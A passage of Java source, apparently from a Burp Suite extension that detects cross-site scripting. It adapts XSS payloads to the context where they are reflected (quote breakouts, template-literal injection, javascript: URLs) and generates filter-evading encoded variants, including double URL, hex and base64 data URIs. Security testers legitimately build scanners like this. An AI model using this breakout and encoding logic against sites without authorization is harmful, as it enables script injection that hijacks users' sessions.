            if ("ATTRIBUTE_URL_EXECUTION".equals(context) || "URL_JAVASCRIPT_EXECUTION".equals(context)) {
                // For javascript: protocol or URL attributes, payload should be properly formatted
                // NOT URL encoded! The payload should be: javascript:alert(1) not javascript%3aalert%281%29
                // Only encode if it's being injected as a URL parameter value, not as JavaScript code
                if (payload.startsWith("javascript:") || payload.startsWith("data:") || payload.startsWith("vbscript:")) {
                    // This is already a protocol URL - don't encode it!
                    return payload;
                }
                // If it's a JavaScript payload for URL context, format it properly
                if (payload.contains("alert") || payload.contains("eval") || payload.contains("Function") ||
                    payload.contains("setTimeout") || payload.contains("setInterval") || payload.contains("location")) {
                    // JavaScript code for URL - don't URL encode!
                    // For URL attributes, we need to break out and inject: '><a href="javascript:alert(1)">
                    if (payload.contains("\"") || payload.contains("'")) {
                        return payload; // Already has quote breaking
                    }
                    // Return raw payload - it will break context properly
                    return payload;
                }
                // Only URL encode if it's a plain string value (like a file path)
                // But be careful - don't encode if it might break the URL structure
                if (payload.contains("/") || payload.contains(".")) {
                    // Looks like a path - only encode spaces and special chars that break URLs
                    return payload.replace(" ", "%20").replace("<", "%3C").replace(">", "%3E");
                }
                // For other plain values, URL encode
                return helpers.urlEncode(payload);
            }
            
            // CSS context encoding (style attributes, <style> tags, CSS @import, url())
            if (context != null && (context.contains("CSS") || context.contains("STYLE"))) {
                // CSS contexts require special handling
                // For style attributes: break out with </style> or use expression()
                if (context.contains("style=") || context.contains("STYLE_ATTRIBUTE")) {
                    // Style attribute - can use expression() or break out
                    if (payload.contains("expression(") || payload.contains("javascript:")) {
                        return payload; // Already has CSS execution payload
                    }
                    // Try to break out of style attribute
                    if (payload.contains("</style>") || payload.contains("</STYLE>")) {
                        return payload; // Already breaks out
                    }
                    // For style attributes, expression() works in older IE
                    // Modern browsers need different approach
                    return payload;
                }
                // For <style> tags or CSS @import
                if (context.contains("<style") || context.contains("@import") || context.contains("url(")) {
                    // CSS injection - use expression() or javascript: in url()
                    if (payload.contains("expression(") || payload.contains("javascript:") || payload.contains("url(javascript:")) {
                        return payload;
                    }
                    // CSS injection payload
                    return payload;
                }
                // Default CSS context
                return payload;
            }
            
            // SVG context encoding
            if (context != null && (context.contains("SVG") || context.contains("svg"))) {
                // SVG contexts can execute JavaScript in event handlers
                // SVG is XML-based, so needs XML escaping for attributes
                // But event handlers in SVG can execute JavaScript
                if (context.contains("onload") || context.contains("onerror") || context.contains("onclick")) {
                    // SVG event handler - use raw payload
                    return payload;
                }
                // SVG attribute - may need XML escaping
                if (context.contains("ATTRIBUTE")) {
                    // SVG attributes are XML attributes
                    return payload.replace("&", "&amp;")
                                 .replace("<", "&lt;")
                                 .replace(">", "&gt;")
                                 .replace("\"", "&quot;");
                }
                // SVG body - can contain script tags
                return payload;
            }
            
            // HTML comment context - detected but not exploitable
            if (context != null && (context.contains("COMMENT") || context.contains("<!--"))) {
                // HTML comments are not exploitable - but we still need to handle encoding
                // If payload breaks out of comment, it becomes exploitable
                if (payload.contains("-->")) {
                    // Payload breaks out of comment - exploitable
                    return payload;
                }
                // Payload stays in comment - not exploitable, but encode anyway
                return payload;
            }
            
            // CDATA section context
            if (context != null && (context.contains("CDATA") || context.contains("<![CDATA["))) {
                // CDATA sections can contain script tags that execute
                // If payload breaks out of CDATA, it becomes exploitable
                if (payload.contains("]]>")) {
                    // Payload breaks out of CDATA - exploitable
                    return payload;
                }
                // Payload in CDATA - may still execute if it's a script tag
                return payload;
            }
            
            // JavaScript template literal context (backticks)
            if (context != null && (context.contains("TEMPLATE_LITERAL") || context.contains("`"))) {
                // Template literals use backticks - need to break out with ${} or backtick
                if (payload.contains("${") || payload.contains("`")) {
                    return payload; // Already has template literal breaking
                }
                // Template literal breaking
                return "${" + payload + "}";
            }
            
            // Data attribute context (HTML5 data-* attributes)
            if (context != null && (context.contains("DATA_ATTR") || context.contains("data-"))) {
                // Data attributes are regular HTML attributes
                // Need to break out with quote
                if (payload.contains("\"") || payload.contains("'")) {
                    return payload; // Already has quote breaking
                }
                // Break out of data attribute
                return "\" " + payload;
            }
            
            // Event handler attribute context (onclick, onerror, onload, etc.)
            if (context != null && (context.contains("EVENT_HANDLER") || 
                                   context.contains("onclick") || context.contains("onerror") || 
                                   context.contains("onload") || context.contains("onmouseover"))) {
                // Event handlers execute JavaScript directly
                // Payload should be JavaScript code, not HTML
                if (payload.contains("alert") || payload.contains("eval") || payload.contains("Function")) {
                    return payload; // Already JavaScript code
                }
                // Convert HTML payload to event handler payload
                if (payload.contains("<script")) {
                    // Extract JavaScript from script tag
                    int scriptStart = payload.indexOf("<script");
                    int scriptEnd = payload.indexOf("</script>");
                    if (scriptEnd > scriptStart) {
                        String jsCode = payload.substring(scriptStart + 7, scriptEnd).trim();
                        // Remove > if present
                        if (jsCode.startsWith(">")) {
                            jsCode = jsCode.substring(1);
                        }
                        return jsCode;
                    }
                }
                // Default: use payload as-is for event handlers
                return payload;
            }
            
            // HTML attribute context encoding
            if ("HTML_ATTRIBUTE".equals(context)) {
                // For HTML attributes, we need to break out of the attribute
                // If payload already breaks out (contains " or '), use as-is
                if (payload.contains("\"") || payload.contains("'")) {
                    return payload; // Already has quote breaking
                }
                // Otherwise, try HTML entity encoding for special chars only
                // Don't URL encode the entire payload - that breaks it!
                return payload.replace("<", "&lt;").replace(">", "&gt;");
            }
            
            // HTML body/tag context - use raw payload (most effective)
            if ("HTML_BODY".equals(context) || "HTML_TAG".equals(context) || "HTML_VOID_ELEMENT".equals(context)) {
                // For HTML context, raw payload works best
                // Most XSS payloads work best unencoded in HTML body
                return payload;
            }
            
            // URL context encoding (for reflection context, not parameter type)
            // Note: Parameter type encoding already handled above
            if ("URL".equals(context) && paramType != IParameter.PARAM_URL) {
                // Reflection context is URL but parameter is not URL type - URL encode
                if (!payload.contains("javascript:") && !payload.contains("alert") && !payload.contains("eval")) {
                    return helpers.urlEncode(payload);
                }
                return payload; // JavaScript code shouldn't be URL encoded
            }
            
            // UNKNOWN context - try raw payload first (most effective for HTML)
            // Only URL encode as last resort
            if ("UNKNOWN".equals(context)) {
                return payload; // Try raw first
            }
            
            // Default: try raw payload first (most XSS payloads work unencoded)
            return payload;
            
        } catch (Exception e) {
            // Fallback to URL encoding
            return helpers.urlEncode(payload);
        }
    }
    
    /**
     * Generate multiple encoded versions of payload for detection
     */
    private String[] generateEncodedVersions(String payload) {
        List<String> encoded = new ArrayList<>();
        
        // URL encoding variations
        encoded.add(helpers.urlEncode(payload));
        encoded.add(helpers.urlEncode(helpers.urlEncode(payload))); // Double encoding
        
        // HTML entity encoding
        encoded.add(payload.replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;").replace("'", "&#39;"));
        
        // HTML numeric entity encoding
        encoded.add(payload.replace("<", "&#60;").replace(">", "&#62;").replace("\"", "&#34;").replace("'", "&#39;"));
        
        // HTML hex entity encoding
        encoded.add(payload.replace("<", "&#x3C;").replace(">", "&#x3E;").replace("\"", "&#x22;").replace("'", "&#x27;"));
        
        // JavaScript string escaping
        encoded.add(payload.replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'"));
        
        // JavaScript hex encoding (\x3c style)
        StringBuilder hex = new StringBuilder();
        for (char c : payload.toCharArray()) {
            if (c < 128) {
                hex.append("\\x").append(String.format("%02x", (int) c));
            } else {
                hex.append(c);
            }
        }
        encoded.add(hex.toString());
        
        // Unicode encoding
        StringBuilder unicode = new StringBuilder();
        for (char c : payload.toCharArray()) {
            if (c > 127) {
                unicode.append("\\u").append(String.format("%04x", (int) c));
            } else {
                unicode.append(c);
            }
        }
        encoded.add(unicode.toString());
        
        // Base64 encoding (for data URIs)
        try {
            String base64Encoded = java.util.Base64.getEncoder().encodeToString(payload.getBytes(StandardCharsets.UTF_8));
            encoded.add("data:text/html;base64," + base64Encoded);
            encoded.add("data:text/html,<script>" + payload + "</script>");
        } catch (Exception e) {
            // Ignore base64 encoding errors
        }
        
        return encoded.toArray(new String[0]);
    }
    
    /**
     * ADVANCED: Analyze XSS context with full browser execution awareness
     * This understands how browsers parse HTML and execute JavaScript
     */
    private String analyzeXSSContext(String responseBody, String payload) {
        // Look for payload in different contexts
        int payloadIndex = responseBody.indexOf(payload);
        if (payloadIndex == -1) return null;
        
        // Get extended context around payload for deep analysis
        int start = Math.max(0, payloadIndex - 500);
        int end = Math.min(responseBody.length(), payloadIndex + payload.length() + 500);
        String context = responseBody.substring(start, end);
        int relativePayloadIndex = payloadIndex - start;
        
        // ADVANCED: Check for direct JavaScript execution context
        if (context.contains("<script")) {
            int scriptStart = context.lastIndexOf("<script", relativePayloadIndex);
            if (scriptStart >= 0) {
                int scriptTagEnd = context.indexOf(">", scriptStart);
                if (scriptTagEnd > scriptStart) {
                    int scriptEnd = context.indexOf("</script>", scriptTagEnd);
                    if (scriptEnd > scriptTagEnd && relativePayloadIndex > scriptTagEnd && relativePayloadIndex < scriptEnd) {
                        String scriptContent = context.substring(scriptTagEnd + 1, scriptEnd);
                        String beforePayload = scriptContent.substring(0, relativePayloadIndex - scriptTagEnd - 1);
                        
                        // Check if in string context
                        int singleQuotes = countUnescapedQuotes(beforePayload, '\'');
                        int doubleQuotes = countUnescapedQuotes(beforePayload, '"');
                        
                        if (singleQuotes % 2 == 1) {
                            return "JavaScript String (Single Quote) - Can break out and execute";
                        }
                        if (doubleQuotes % 2 == 1) {
                            return "JavaScript String (Double Quote) - Can break out and execute";
                        }
                        
                        // Direct execution - HIGHEST RISK
                        return "JavaScript Execution Context (CRITICAL) - Browser will execute payload directly as JavaScript code";
                    }
                }
            }
        }
        
        // ADVANCED: Check for event handler execution context
        String[] eventHandlers = {"onload", "onerror", "onclick", "onmouseover", "onfocus", "onblur"};
        for (String handler : eventHandlers) {
            int handlerIndex = context.toLowerCase().indexOf(handler + "=", Math.max(0, relativePayloadIndex - 200));
            if (handlerIndex >= 0 && handlerIndex < relativePayloadIndex) {
                int valueStart = context.indexOf("=", handlerIndex) + 1;
                while (valueStart < context.length() && (context.charAt(valueStart) == ' ' || 
                       context.charAt(valueStart) == '"' || context.charAt(valueStart) == '\'')) {
                    valueStart++;
                }
                int valueEnd = findAttributeValueEnd(context, valueStart);
                if (relativePayloadIndex >= valueStart && relativePayloadIndex < valueEnd) {
                    return "Event Handler Execution (HIGH RISK) - Browser will execute payload when event fires: " + handler;
                }
            }
        }
        
        // ADVANCED: Check for CSS context (style attributes, <style> tags, CSS @import, url())
        if (context.contains("<style") || context.contains("style=") || context.contains("@import") || 
            context.contains("url(") || context.contains("expression(")) {
            int styleStart = context.lastIndexOf("<style", relativePayloadIndex);
            int styleAttrStart = context.lastIndexOf("style=", relativePayloadIndex);
            int importStart = context.lastIndexOf("@import", relativePayloadIndex);
            
            if (styleStart >= 0) {
                int styleEnd = context.indexOf("</style>", styleStart);
                if (styleEnd > styleStart && relativePayloadIndex > styleStart && relativePayloadIndex < styleEnd) {
                    // Check for CSS execution (expression(), javascript: in url())
                    String styleContent = context.substring(styleStart, styleEnd);
                    if (styleContent.contains("expression(") || styleContent.contains("javascript:") ||
                        styleContent.contains("url(javascript:")) {
                        return "CSS Execution Context (HIGH RISK) - CSS with execution capability";
                    }
                    return "CSS Context (MEDIUM RISK) - Payload in <style> tag";
                }
            }
            if (styleAttrStart >= 0) {
                int attrValueEnd = findAttributeValueEnd(context, styleAttrStart + 6);
                if (relativePayloadIndex >= styleAttrStart && relativePayloadIndex < attrValueEnd) {
                    return "CSS Style Attribute Context (MEDIUM RISK) - Payload in style attribute";
                }
            }
            if (importStart >= 0) {
                return "CSS @import Context (MEDIUM RISK) - Payload in CSS @import";
            }
        }
        
        // ADVANCED: Check for SVG context
        if (context.contains("<svg") || context.contains("svg:") || context.contains("xmlns:svg")) {
            int svgStart = context.lastIndexOf("<svg", relativePayloadIndex);
            if (svgStart >= 0) {
                int svgEnd = context.indexOf("</svg>", svgStart);
                if (svgEnd < 0) svgEnd = context.length();
                if (relativePayloadIndex >= svgStart && relativePayloadIndex < svgEnd) {
                    // Check for SVG event handlers
                    String svgContent = context.substring(svgStart, Math.min(svgEnd, svgStart + 500));
                    if (svgContent.contains("onload") || svgContent.contains("onerror") || 
                        svgContent.contains("onclick")) {
                        return "SVG Event Handler Context (HIGH RISK) - SVG with event handler";
                    }
                    return "SVG Context (MEDIUM RISK) - Payload in SVG element";
                }
            }
        }
        
        // ADVANCED: Check for MathML context
        if (context.contains("<math") || context.contains("math:") || context.contains("xmlns:math") ||
            context.contains("<m:") || context.contains("mathml")) {
            int mathStart = context.lastIndexOf("<math", relativePayloadIndex);
            if (mathStart < 0) mathStart = context.lastIndexOf("<m:", relativePayloadIndex);
            if (mathStart >= 0) {
                int mathEnd = context.indexOf("</math>", mathStart);
                if (mathEnd < 0) mathEnd = context.indexOf("</m:", mathStart);
                if (mathEnd < 0) mathEnd = context.length();
                if (relativePayloadIndex >= mathStart && relativePayloadIndex < mathEnd) {
                    // MathML can execute JavaScript in some contexts
                    return "MathML Context (MEDIUM RISK) - Payload in MathML element";
                }
            }
        }
        
        // ADVANCED: Check for XHTML context (application/xhtml+xml)
        if (context.contains("xmlns=") && (context.contains("http://www.w3.org/1999/xhtml") || 
                                           context.contains("http://www.w3.org/2000/svg"))) {
            // XHTML is XML-based, needs XML escaping
            return "XHTML Context (MEDIUM RISK) - Payload in XHTML document (XML-based)";
        }
        
        // ADVANCED: Check for HTML comment context
        int commentStart = context.lastIndexOf("<!--", relativePayloadIndex);
        if (commentStart >= 0) {
            int commentEnd = context.indexOf("-->", commentStart);
            if (commentEnd > commentStart && relativePayloadIndex > commentStart && relativePayloadIndex < commentEnd) {
                // Check if payload breaks out of comment
                String commentContent = context.substring(commentStart, commentEnd);
                if (commentContent.contains("-->")) {
                    return "HTML Comment Breakout (HIGH RISK) - Payload breaks out of HTML comment";
                }
                return "HTML Comment Context (LOW RISK) - Payload in HTML comment (not exploitable unless breaks out)";
            }
        }
        
        // ADVANCED: Check for CDATA section context
        int cdataStart = context.lastIndexOf("<![CDATA[", relativePayloadIndex);
        if (cdataStart >= 0) {
            int cdataEnd = context.indexOf("]]>", cdataStart);
            if (cdataEnd > cdataStart && relativePayloadIndex > cdataStart && relativePayloadIndex < cdataEnd) {
                // Check if payload breaks out of CDATA
                String cdataContent = context.substring(cdataStart, cdataEnd);
                if (cdataContent.contains("]]>")) {
                    return "CDATA Breakout (HIGH RISK) - Payload breaks out of CDATA section";
                }
                // CDATA can contain script tags that execute
                if (cdataContent.contains("<script")) {
                    return "CDATA Script Context (HIGH RISK) - Script tag in CDATA section";
                }
                return "CDATA Context (MEDIUM RISK) - Payload in CDATA section";
            }
        }
        
        // ADVANCED: Check for JavaScript template literal context (backticks)
        int templateStart = context.lastIndexOf("`", relativePayloadIndex);
        if (templateStart >= 0) {
            int templateEnd = context.indexOf("`", templateStart + 1);
            if (templateEnd > templateStart && relativePayloadIndex > templateStart && relativePayloadIndex < templateEnd) {
                // Check if payload uses ${} interpolation
                String templateContent = context.substring(templateStart, templateEnd);
                if (templateContent.contains("${") || templateContent.contains("`")) {
                    return "JavaScript Template Literal Context (HIGH RISK) - Template literal with interpolation";
                }
                return "JavaScript Template Literal Context (MEDIUM RISK) - Payload in template literal";
            }
        }
        
        // ADVANCED: Check for data-* attribute context
        int dataAttrStart = context.lastIndexOf("data-", relativePayloadIndex);
        if (dataAttrStart >= 0) {
            int attrValueEnd = findAttributeValueEnd(context, dataAttrStart);
            if (relativePayloadIndex >= dataAttrStart && relativePayloadIndex < attrValueEnd) {
                return "HTML5 Data Attribute Context (MEDIUM RISK) - Payload in data-* attribute";
            }
        }
        
        // ADVANCED: Check for URL execution context
        if (context.contains("javascript:") || context.contains("data:text/html") || 
            context.contains("data:text/javascript") || context.contains("vbscript:")) {
            return "URL Protocol Execution (HIGH RISK) - Browser will execute payload via URL protocol";
        }
        
        // Check for HTML attribute context
        if (context.matches(".*<[^>]*\\s+\\w+\\s*=\\s*[\"']?[^\"']*" + Pattern.quote(payload) + ".*")) {
            // Check if it's an event handler attribute (using existing eventHandlers array from above)
            // Note: eventHandlers array already defined earlier in method
            for (String handler : eventHandlers) {
                if (context.toLowerCase().contains(handler + "=")) {
                    return "Event Handler Attribute Context (HIGH RISK) - Payload in " + handler + " attribute";
                }
            }
            return "HTML Attribute Context (MEDIUM RISK) - Payload in HTML attribute - event handler injection possible";
        }
        
        // Check for HTML tag context
        if (context.matches(".*<[^>]*>" + Pattern.quote(payload) + ".*")) {
            return "HTML Content Context (MEDIUM RISK) - Payload in HTML content - tag injection possible";
        }
        
        // CRITICAL: Try to determine context from payload position
        // Check if payload is in HTML content (between tags)
        if (context.contains("<") && context.contains(">")) {
            // Check if payload is between HTML tags
            int lastTagEnd = context.lastIndexOf(">", relativePayloadIndex);
            int nextTagStart = context.indexOf("<", relativePayloadIndex);
            if (lastTagEnd >= 0 && (nextTagStart < 0 || nextTagStart > relativePayloadIndex)) {
                return "HTML Body Context (MEDIUM RISK) - Payload in HTML body content - tag injection possible";
            }
        }
        
        // If payload contains XSS indicators, it's likely exploitable
        if (payload.contains("alert") || payload.contains("eval") || payload.contains("onerror") || 
            payload.contains("onload") || payload.contains("javascript:")) {
            return "HTML Body Context (MEDIUM RISK) - Payload with XSS indicators in HTML content";
        }
        
        return "Unknown Context (LOW RISK) - Payload reflected in unknown context";
    }
    
    /**
     * Count unescaped quotes in string (for JavaScript string detection)
     */
    private int countUnescapedQuotes(String text, char quote) {
        int count = 0;
        boolean escaped = false;
        for (int i = 0; i < text.length(); i++) {
            char c = text.charAt(i);
            if (escaped) {
                escaped = false;
                continue;
            }
            if (c == '\\') {
                escaped = true;
                continue;
            }
            if (c == quote) {
                count++;
            }
        }
        return count;
    }
    
    /**
     * Find the end of an HTML attribute value
     */
    private int findAttributeValueEnd(String context, int start) {
        if (start >= context.length()) return context.length();
        
        char quote = context.charAt(start);
        if (quote == '"' || quote == '\'') {
            for (int i = start + 1; i < context.length(); i++) {
                if (context.charAt(i) == quote && context.charAt(i - 1) != '\\') {
                    return i + 1;
                }
            }
            return context.length();
        } else {
            for (int i = start; i < context.length(); i++) {
                char c = context.charAt(i);
                if (c == ' ' || c == '>' || c == '/' || c == '\n' || c == '\r' || c == '\t') {
                    return i;
                }
            }
            return context.length();
        }
    }
    
    /**
     * Detect JavaScript execution indicators
     */
    private boolean detectJavaScriptExecution(String responseBody, String payload) {
        // Look for common JavaScript execution patterns
        String[] jsPatterns = {
            "alert\\s*\\(", "confirm\\s*\\(", "prompt\\s*\\(",
            "eval\\s*\\(", "setTimeout\\s*\\(", "setInterval\\s*\\(",
            "document.write\\s*\\(", "innerHTML\\s*=", "outerHTML\\s*="
        };
        
        for (String pattern : jsPatterns) {
            if (responseBody.matches(".*" + pattern + ".*")) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * ADVANCED: Analyze browser execution flow - how browser will parse and execute the response
     */
    private String analyzeBrowserExecutionFlow(String responseBody, String payload) {
        try {
            int payloadIndex = responseBody.indexOf(payload);
            if (payloadIndex < 0) return null;
            
            StringBuilder flow = new StringBuilder();
            
            // Check HTML parsing phase
            String beforePayload = responseBody.substring(Math.max(0, payloadIndex - 1000), payloadIndex);
            String afterPayload = responseBody.substring(payloadIndex + payload.length(), 
                                                         Math.min(responseBody.length(), payloadIndex + payload.length() + 1000));
            
            // 1. HTML Parsing Phase
            if (beforePayload.contains("<html") || beforePayload.contains("<!DOCTYPE")) {
                flow.append("HTML Parsing: Browser will parse as HTML document. ");
            }
            
            // 2. Script Execution Phase
            if (beforePayload.contains("<script") && !beforePayload.contains("</script>")) {
                flow.append("Script Execution: Payload is in active script tag - browser will execute immediately. ");
            } else if (afterPayload.contains("</script>") && !beforePayload.contains("</script>")) {
                flow.append("Script Execution: Payload is before script tag closes - browser will execute. ");
            }
            
            // 3. Event Handler Execution Phase
            if (beforePayload.matches(".*on\\w+\\s*=\\s*[\"']?[^\"']*$")) {
                flow.append("Event Handler: Payload is in event handler - browser will execute on event trigger. ");
            }
            
            // 4. DOM Construction Phase
            if (afterPayload.contains("</body>") || afterPayload.contains("</html>")) {
                flow.append("DOM Construction: Payload is in document body - browser will render in DOM. ");
            }
            
            // 5. JavaScript Runtime Phase
            if (beforePayload.contains("eval(") || beforePayload.contains("Function(") || 
                beforePayload.contains("setTimeout") || beforePayload.contains("setInterval")) {
                flow.append("JavaScript Runtime: Payload may be executed by JavaScript runtime. ");
            }
            
            // 6. URL Navigation Phase
            if (beforePayload.contains("href=") || beforePayload.contains("src=") || 
                beforePayload.contains("action=") || beforePayload.contains("formaction=")) {
                if (payload.contains("javascript:") || payload.contains("data:text/html") || 
                    payload.contains("data:text/javascript")) {
                    flow.append("URL Navigation: Payload uses executable URL protocol - browser will execute on navigation. ");
                }
            }
            
            return flow.length() > 0 ? flow.toString().trim() : null;
            
        } catch (Exception e) {
            return null;
        }
    }
    
    /**
     * ADVANCED: Detect browser parsing quirks that may enable execution
     */
    private boolean detectBrowserParsingQuirks(String responseBody, String payload) {
        try {
            int payloadIndex = responseBody.indexOf(payload);
            if (payloadIndex < 0) return false;
            
            String context = responseBody.substring(Math.max(0, payloadIndex - 200), 
                                                    Math.min(responseBody.length(), payloadIndex + payload.length() + 200));
            
            // Check for malformed HTML that browsers may parse differently
            // 1. Unclosed tags
            if (context.contains("<script") && !context.contains("</script>")) {
                return true; // Browser may execute unclosed script
            }
            
            // 2. Nested script tags
            if (context.matches(".*<script[^>]*>.*<script.*")) {
                return true; // Nested scripts - browser behavior varies
            }
            
            // 3. Script in comments
            if (context.contains("<!--") && context.contains("<script") && context.contains("-->")) {
                return true; // Some browsers execute scripts in comments
            }
            
            // 4. Script in CDATA
            if (context.contains("<![CDATA[") && context.contains("<script")) {
                return true; // CDATA may affect parsing
            }
            
            // 5. Attribute without quotes
            if (context.matches(".*<[^>]+\\s+\\w+\\s*=\\s*[^\"'>\\s]" + Pattern.quote(payload) + ".*")) {
                return true; // Unquoted attributes - browser parsing quirks
            }
            
            // 6. Mixed case tags
            if (context.matches(".*<[Ss][Cc][Rr][Ii][Pp][Tt].*")) {
                return true; // Mixed case - some browsers handle differently
            }
            
            return false;
            
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * Detect DOM manipulation indicators
     */
    private boolean detectDOMManipulation(String responseBody, String payload) {
        // Look for DOM manipulation patterns
        return responseBody.contains("createElement") || 
               responseBody.contains("appendChild") ||
               responseBody.contains("insertAdjacentHTML") ||
               responseBody.contains("insertBefore");
    }
    
    /**
     * Extract response body from full HTTP response
     */
    private String extractResponseBody(String response) {
        try {
            int bodyStart = response.indexOf("\n\n");
            if (bodyStart != -1) {
                return response.substring(bodyStart + 2);
            }
            return response;
        } catch (Exception e) {
            return response;
        }
    }

    /**
     * Find all occurrences of a byte pattern and return Burp-compatible marker ranges.
     * Each range is an int[2] of {startOffset, endOffset}.
     */
    private List<int[]> findAllByteMatches(byte[] data, byte[] pattern, int maxMatches) {
        if (data == null || pattern == null || pattern.length == 0) {
            return java.util.Collections.emptyList();
        }
        List<int[]> out = new ArrayList<>();
        int from = 0;
        while (from < data.length && out.size() < maxMatches) {
            int idx = helpers.indexOf(data, pattern, true, from, data.length);
            if (idx < 0) break;
            out.add(new int[] { idx, idx + pattern.length });
            from = idx + Math.max(1, pattern.length);
        }
        return out;
    }
    
    /**
     * Create enhanced vulnerability report
     */
    private Map createEnhancedVulnerabilityReport(Map parameter, String payload, 
                                                 AdvancedResponseAnalysis analysis, String testRequest) {
        Map report = new HashMap();
        
        // Basic information
        report.put(NAME, parameter.get(NAME));
        report.put(VALUE, payload);
        report.put(TYPE, parameter.get(TYPE));
        report.put(VULNERABLE, "CONFIRMED");
        
        // CRITICAL FIX: Store payload and request/response information for reproduction
        report.put("payload", payload);
        if (testRequest != null) {
            // Convert String to byte[] if needed
            if (testRequest instanceof String) {
                report.put("TEST_REQUEST", ((String) testRequest).getBytes(StandardCharsets.UTF_8));
            } else {
        report.put("TEST_REQUEST", testRequest);
            }
        }
        // CRITICAL: Also store TEST_RESPONSE if available
        String testResponseStr = getLastResponse();
        if (testResponseStr != null && !testResponseStr.isEmpty()) {
            report.put("TEST_RESPONSE", testResponseStr.getBytes(StandardCharsets.UTF_8));
        }
        
        // Enhanced analysis results
        report.put("CONFIDENCE_SCORE", analysis.getConfidence());
        report.put("VULNERABILITY_TYPE", analysis.getVulnerabilityTypeCustom());
        report.put("EVIDENCE", analysis.getEvidence());
        report.put("EXPLOITATION_DIFFICULTY", analysis.getExploitationDifficultyCustom());
        report.put("PAYLOAD_CATEGORY", payloadManager.getPayloadCategory(payload));
        
        // CRITICAL FIX: Add response snippet extraction
        try {
            if (testResponseStr != null && !testResponseStr.isEmpty()) {
                String responseSnippet = extractResponseSnippet(testResponseStr, payload, 150);
                if (responseSnippet != null) {
                    report.put("RESPONSE_SNIPPET", responseSnippet);
                }
            }
        } catch (Exception e) {
            callbacks.printError("Failed to extract response snippet: " + e.getMessage());
        }
        
        // CRITICAL FIX: Create detailed payload analysis
        StringBuilder payloadAnalysis = new StringBuilder();
        payloadAnalysis.append("Advanced Payload Analysis:\n");
        payloadAnalysis.append("- Payload Type: ").append(payloadManager.getPayloadCategory(payload)).append("\n");
        payloadAnalysis.append("- Attack Vector: ").append(getAttackVector(payload)).append("\n");
        payloadAnalysis.append("- Bypass Techniques: ").append(getBypassTechniques(payload)).append("\n");
        payloadAnalysis.append("- Confidence Level: ").append(String.format("%.1f%%", analysis.getConfidence())).append("\n");
        payloadAnalysis.append("- Exploitation: ").append(analysis.getExploitationDifficultyCustom()).append("\n");
        
        // Add evidence analysis
        payloadAnalysis.append("- Evidence Found:\n");
        for (String evidence : analysis.getEvidence()) {
            payloadAnalysis.append("  - ").append(evidence).append("\n");
        }
        
        report.put("PAYLOAD_PARTS_ANALYSIS", payloadAnalysis.toString());
        
        // Risk assessment
        report.put("RISK_SCORE", calculateRiskScore(analysis));
        report.put("BUSINESS_IMPACT", assessBusinessImpact(analysis));
        report.put("REMEDIATION_PRIORITY", calculateRemediationPriority(analysis));
        
        callbacks.printOutput("Enhanced XSS vulnerability confirmed for parameter: " + parameter.get(NAME));
        callbacks.printOutput("Confidence: " + analysis.getConfidence() + "%");
        callbacks.printOutput("Evidence: " + analysis.getEvidence().size() + " indicators");
        
        return report;
    }
    
    /**
     * CRITICAL FIX: Get the last response for snippet extraction
     */
    private String getLastResponse() {
        return lastTestResponse;
    }
    
    /**
     * CRITICAL: Determine reflection context from response (similar to CheckReflection.determineReflectionContext)
     */
    private String determineReflectionContextFromResponse(String responseBody, String payload) {
        try {
            // CRITICAL FIX: Try multiple search strategies before returning UNKNOWN
            int payloadIndex = responseBody.indexOf(payload);
            
            // If not found, try case-insensitive search
            if (payloadIndex < 0) {
                String lowerResponse = responseBody.toLowerCase();
                String lowerPayload = payload.toLowerCase();
                payloadIndex = lowerResponse.indexOf(lowerPayload);
            }
            
            // If still not found, try URL decoded version
            if (payloadIndex < 0) {
                try {
                    String urlDecoded = helpers.urlDecode(payload);
                    if (urlDecoded != null && !urlDecoded.equals(payload)) {
                        payloadIndex = responseBody.indexOf(urlDecoded);
                    }
                } catch (Exception e) {
                    // Ignore
                }
            }
            
            // If still not found, try HTML entity decoded version
            if (payloadIndex < 0) {
                try {
                    String htmlDecoded = payload.replace("&lt;", "<").replace("&gt;", ">")
                                               .replace("&quot;", "\"").replace("&#39;", "'")
                                               .replace("&amp;", "&");
                    if (!htmlDecoded.equals(payload)) {
                        payloadIndex = responseBody.indexOf(htmlDecoded);
                    }
                } catch (Exception e) {
                    // Ignore
                }
            }
            
            // If still not found, try partial match (at least 70% of payload)
            if (payloadIndex < 0 && payload.length() > 5) {
                int minMatchLength = (int)(payload.length() * 0.7);
                for (int i = 0; i <= payload.length() - minMatchLength; i++) {
                    String partial = payload.substring(i, Math.min(i + minMatchLength, payload.length()));
                    payloadIndex = responseBody.indexOf(partial);
                    if (payloadIndex >= 0) {
                        break;
                    }
                }
            }
            
            if (payloadIndex < 0) {
                return "UNKNOWN";
            }
            
            // Extract extended context around reflection for deep analysis
            int contextStart = Math.max(0, payloadIndex - 500);
            int contextEnd = Math.min(responseBody.length(), payloadIndex + payload.length() + 500);
            String context = responseBody.substring(contextStart, contextEnd);
            int relativePayloadIndex = payloadIndex - contextStart;
            
            // Check for JavaScript execution context
            if (context.contains("<script")) {
                int scriptStart = context.lastIndexOf("<script", relativePayloadIndex);
                if (scriptStart >= 0) {
                    int scriptTagEnd = context.indexOf(">", scriptStart);
                    if (scriptTagEnd > scriptStart) {
                        int scriptEnd = context.indexOf("</script>", scriptTagEnd);
                        if (scriptEnd > scriptTagEnd && relativePayloadIndex > scriptTagEnd && relativePayloadIndex < scriptEnd) {
                            // Check if in string context
                            String scriptContent = context.substring(scriptTagEnd + 1, scriptEnd);
                            String beforePayload = scriptContent.substring(0, relativePayloadIndex - scriptTagEnd - 1);
                            int singleQuotes = countUnescapedQuotes(beforePayload, '\'');
                            int doubleQuotes = countUnescapedQuotes(beforePayload, '"');
                            
                            if (singleQuotes % 2 == 1) {
                                return "JAVASCRIPT_STRING_SINGLE";
                            }
                            if (doubleQuotes % 2 == 1) {
                                return "JAVASCRIPT_STRING_DOUBLE";
                            }
                            return "JAVASCRIPT_EXECUTION";
                        }
                    }
                }
            }
            
            // Check for event handler context
            String[] eventHandlers = {"onload", "onerror", "onclick", "onmouseover", "onfocus", "onblur"};
            for (String handler : eventHandlers) {
                int handlerIndex = context.toLowerCase().indexOf(handler + "=", Math.max(0, relativePayloadIndex - 200));
                if (handlerIndex >= 0 && handlerIndex < relativePayloadIndex) {
                    int valueStart = context.indexOf("=", handlerIndex) + 1;
